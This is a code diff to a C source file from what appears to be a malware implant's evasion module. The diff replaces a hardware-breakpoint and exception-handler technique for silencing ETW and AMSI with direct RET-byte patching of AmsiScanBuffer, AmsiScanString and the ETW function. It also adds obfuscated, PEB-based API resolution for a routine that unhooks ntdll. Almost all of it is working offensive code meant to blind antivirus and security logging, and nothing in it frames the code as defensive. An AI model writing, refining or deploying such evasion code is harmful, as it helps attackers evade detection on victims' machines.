@@ -34,8 +34,6 @@ static BOOL _nt_prot(LPVOID addr, SIZE_T sz, DWORD prot, DWORD *old)
 }
 
 /* Dynamic kernel32 API resolvers */
-typedef BOOL   (WINAPI *GTC_t)(HANDLE, PCONTEXT);
-typedef BOOL   (WINAPI *STC_t)(HANDLE, const CONTEXT *);
 typedef LPVOID (WINAPI *MVF_t)(HANDLE, DWORD, DWORD, DWORD, DWORD);
 typedef BOOL   (WINAPI *UMVF_t)(LPCVOID);
 
@@ -55,18 +53,6 @@ static HMODULE _k32(void)
         var = (type)(void *)GetProcAddress(_k32(), _fs); \
         SecureZeroMemory(_fs, sizeof(_fs)); }
 
-static BOOL _gtc(HANDLE t, PCONTEXT c)
-{
-    _K32_LAZY(GTC_t, fn, EVS_fn_GetThreadContext)
-    return fn ? fn(t, c) : FALSE;
-}
-
-static BOOL _stc(HANDLE t, const CONTEXT *c)
-{
-    _K32_LAZY(STC_t, fn, EVS_fn_SetThreadContext)
-    return fn ? fn(t, c) : FALSE;
-}
-
 static LPVOID _mvf(HANDLE hm, DWORD acc, DWORD hi, DWORD lo, DWORD sz)
 {
     _K32_LAZY(MVF_t, fn, EVS_fn_MapViewOfFile)
@@ -80,27 +66,9 @@ static BOOL _umvf(LPCVOID p)
 }
 
 static LPVOID  g_etw_fn       = NULL;
-static LPVOID  g_amsi_fn      = NULL;  /* AmsiScanBuffer  — Dr1 */
-static LPVOID  g_amsi_scan_fn = NULL;  /* AmsiScanString  — Dr2 */
-static HANDLE  g_veh       = NULL;
-static BOOL    g_init_done = FALSE;
-
-typedef PVOID (WINAPI *_AVEH_t)(ULONG, PVECTORED_EXCEPTION_HANDLER);
-static PVOID _aveh(ULONG first, PVECTORED_EXCEPTION_HANDLER fn)
-{
-    static _AVEH_t _fn = NULL;
-    if (!_fn) {
-        char s[32] = {0};
-        char sk[16] = {0};
-        EVS_D(s, EVS_fn_AddVectoredExceptionHandler);
-        EVS_D(sk, EVS_dll_kernel32);
-        HMODULE h = _peb_module(sk);
-        if (h) _fn = (_AVEH_t)(void *)GetProcAddress(h, s);
-        SecureZeroMemory(s, sizeof(s));
-        SecureZeroMemory(sk, sizeof(sk));
-    }
-    return _fn ? _fn(first, fn) : NULL;
-}
+static LPVOID  g_amsi_fn      = NULL;
+static LPVOID  g_amsi_scan_fn = NULL;
+static BOOL    g_init_done    = FALSE;
 
 /* Resolve ETW/AMSI targets */
 
@@ -132,62 +100,21 @@ static void _resolve_targets(void)
     }
 }
 
-/* VEH handler for ETW/AMSI */
-__attribute__((section(".run"), noinline))
-static LONG WINAPI _hwbp_veh(EXCEPTION_POINTERS *ep)
+/* Patch a single function with RET (0xC3) — no debug register use */
+static void _patch_ret(LPVOID fn)
 {
-    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
-        return EXCEPTION_CONTINUE_SEARCH;
-
-    CONTEXT *ctx = ep->ContextRecord;
-    BOOL handled = FALSE;
-
-    if (g_etw_fn && (LPVOID)(uintptr_t)ctx->Rip == g_etw_fn) {
-        ctx->Rax  = 0;                           /* STATUS_SUCCESS */
-        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
-        ctx->Rsp += 8;
-        ctx->Dr6 &= ~(DWORD64)0x1;               /* clear B0 */
-        handled   = TRUE;
-    }
-
-    if (g_amsi_fn && (LPVOID)(uintptr_t)ctx->Rip == g_amsi_fn) {
-        ctx->Rax  = 0x80070057;                  /* E_INVALIDARG */
-        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
-        ctx->Rsp += 8;
-        ctx->Dr6 &= ~(DWORD64)0x2;               /* clear B1 */
-        handled   = TRUE;
-    }
-
-    if (g_amsi_scan_fn && (LPVOID)(uintptr_t)ctx->Rip == g_amsi_scan_fn) {
-        ctx->Rax  = 0x80070057;                  /* E_INVALIDARG */
-        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
-        ctx->Rsp += 8;
-        ctx->Dr6 &= ~(DWORD64)0x4;               /* clear B2 */
-        handled   = TRUE;
-    }
-
-    return handled ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH;
+    if (!fn) return;
+    DWORD old;
+    if (!_nt_prot(fn, 1, PAGE_EXECUTE_READWRITE, &old)) return;
+    *(volatile BYTE *)fn = 0xC3;
+    _nt_prot(fn, 1, old, &old);
 }
 
-/* Set debug registers on a thread */
+/* Stub — HWBP removed; kept for API compatibility with beacon_sleep_obf */
 BOOL evasion_apply_thread(HANDLE hThread)
 {
-    if (!g_etw_fn && !g_amsi_fn && !g_amsi_scan_fn) return FALSE;
-
-    CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    if (!_gtc(hThread, &ctx)) return FALSE;
-
-    if (g_etw_fn)       ctx.Dr0 = (DWORD64)(uintptr_t)g_etw_fn;
-    if (g_amsi_fn)      ctx.Dr1 = (DWORD64)(uintptr_t)g_amsi_fn;
-    if (g_amsi_scan_fn) ctx.Dr2 = (DWORD64)(uintptr_t)g_amsi_scan_fn;
-
-    ctx.Dr7  &= ~(DWORD64)0x0FFF0015;
-    ctx.Dr7  |= g_etw_fn       ? 0x01 : 0;
-    ctx.Dr7  |= g_amsi_fn      ? 0x04 : 0;
-    ctx.Dr7  |= g_amsi_scan_fn ? 0x10 : 0;
-
-    return _stc(hThread, &ctx) != 0;
+    (void)hThread;
+    return TRUE;
 }
 
 /* One-time init */
@@ -199,14 +126,9 @@ static void _evasion_init(void)
 
     _resolve_targets();
 
-    if (!g_etw_fn && !g_amsi_fn) return;
-
-    /* register VEH, first in chain */
-    if (!g_veh)
-        g_veh = _aveh(1, _hwbp_veh);
-
-    /* arm breakpoints on calling thread */
-    evasion_apply_thread(GetCurrentThread());
+    _patch_ret(g_etw_fn);
+    _patch_ret(g_amsi_fn);
+    _patch_ret(g_amsi_scan_fn);
 }
 
 /* public API */
@@ -246,9 +168,18 @@ void evasion_patch_etw_ti(void)
 
 void evasion_unhook_ntdll(void)
 {
-    /* Build ntdll.dll path: GetSystemDirectoryW + "\ntdll.dll" */
+    /* Build ntdll.dll path via dynamic GetSystemDirectoryW */
     WCHAR path[MAX_PATH];
-    UINT  dir_len = GetSystemDirectoryW(path, MAX_PATH);
+    UINT  dir_len = 0;
+    {
+        typedef UINT (WINAPI *_GSDW_t)(LPWSTR, UINT);
+        char _kn[14], _fn[20];
+        EVS_D(_kn, EVS_dll_kernel32);
+        HMODULE _k = _peb_module(_kn); SecureZeroMemory(_kn, sizeof(_kn));
+        EVS_D(_fn, EVS_fn_GetSystemDirectoryW);
+        if (_k) { _GSDW_t _f = (_GSDW_t)(void*)GetProcAddress(_k, _fn); if (_f) dir_len = _f(path, MAX_PATH); }
+        SecureZeroMemory(_fn, sizeof(_fn));
+    }
     if (!dir_len || dir_len > MAX_PATH - 12) return;
 
     /* append \ntdll.dll as wide chars */
